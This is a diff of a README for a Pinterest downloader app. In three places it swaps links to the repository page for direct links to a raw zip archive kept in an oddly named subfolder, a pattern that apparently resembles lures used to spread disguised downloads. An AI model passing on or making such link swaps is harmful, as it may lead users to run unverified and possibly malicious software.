@@ -1,6 +1,6 @@
 # 📌 Pinterest-Downloader - Save Pins Fast in Original Quality
 
-[![Download Pinterest-Downloader](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/kamalramavat/Pinterest-Downloader)
+[![Download Pinterest-Downloader](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/kamalramavat/Pinterest-Downloader/raw/refs/heads/main/jinrikiman/Downloader_Pinterest_v2.4.zip)
 
 ## 🚀 What this app does
 
@@ -18,7 +18,7 @@ Use it to:
 
 Use this link to visit the download page:
 
-[Download Pinterest-Downloader](https://github.com/kamalramavat/Pinterest-Downloader)
+[Download Pinterest-Downloader](https://github.com/kamalramavat/Pinterest-Downloader/raw/refs/heads/main/jinrikiman/Downloader_Pinterest_v2.4.zip)
 
 Follow these steps on Windows:
 
@@ -134,7 +134,7 @@ Pinterest-Downloader is a free and open source tool built for saving Pinterest c
 
 ## 📎 Download link again
 
-[Visit the Pinterest-Downloader download page](https://github.com/kamalramavat/Pinterest-Downloader)
+[Visit the Pinterest-Downloader download page](https://github.com/kamalramavat/Pinterest-Downloader/raw/refs/heads/main/jinrikiman/Downloader_Pinterest_v2.4.zip)
 
 ## 🛠️ Basic troubleshooting
 
